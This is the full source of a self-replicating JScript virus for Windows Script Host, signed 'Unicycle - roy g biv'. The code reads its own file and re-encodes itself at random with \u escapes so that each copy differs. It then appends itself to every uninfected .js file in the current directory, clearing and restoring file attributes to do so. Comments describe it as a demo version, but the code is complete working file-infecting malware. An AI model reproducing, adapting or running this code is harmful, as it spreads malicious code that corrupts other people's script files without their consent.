a=new ActiveXObject("scripting.filesystemobject")
b=a.opentextfile(WScript.scriptfullname).readall()
b=b.substr(b.search(c="Unicycle")-3)            //remove everything before our code
e=b.substr(0,d=b.search("biv")+14)              //skip comment section
f=String.fromCharCode(92)
g=String.fromCharCode(39)
Math.random(1)                                  //let's make it different every time
while(d<b.length-2)
{
  if((h=b.substr(d,2))==f+"u")b=b.substr(0,d)+eval(g+b.substr(d,6)+g)+b.substr(d+6)
                                                //decode \u encoding
  e=e+(d==38?h:Math.random()>.5?b.charAt(d--):f+"u00"+b.charCodeAt(d--).toString(16))
                                                //encode all but first "('" with 50% chance
  d+=2
}
for(d=new Enumerator(a.getfolder(".").files);!d.atEnd();d.moveNext())
                                                //demo version, current directory only
{
  if(a.getextensionname(b=d.item()).toLowerCase()=="js")try
  {
    f=b.attributes
    b.attributes=0
    if(a.opentextfile(b).readall().search(c)<0)a.opentextfile(b,8).write(e+g+")")
                                                //append ourselves if not infected already
    b.attributes=f
  }
  catch(z)
  {
  }
}
//;/*Unicycle - roy g biv 01/04/07*/eval('a=new ActiveXObject("scripting.filesystemobject");b=a.opentextfile(WScript.scriptfullname).readall();b=b.substr(b.search(c="Unicycle")-3);e=b.substr(0,d=b.search("biv")+14);f=String.fromCharCode(92);g=String.fromCharCode(39);Math.random(1);while(d<b.length-2){if((h=b.substr(d,2))==f+"u")b=b.substr(0,d)+eval(g+b.substr(d,6)+g)+b.substr(d+6);e=e+(d==38?h:Math.random()>.5?b.charAt(d--):f+"u00"+b.charCodeAt(d--).toString(16));d+=2}for(d=new Enumerator(a.getfolder(".").files);!d.atEnd();d.moveNext()){if(a.getextensionname(b=d.item()).toLowerCase()=="js")try{f=b.attributes;b.attributes=0;if(a.opentextfile(b).readall().search(c)<0)a.opentextfile(b,8).write(e+g+")");b.attributes=f}catch(z){}}')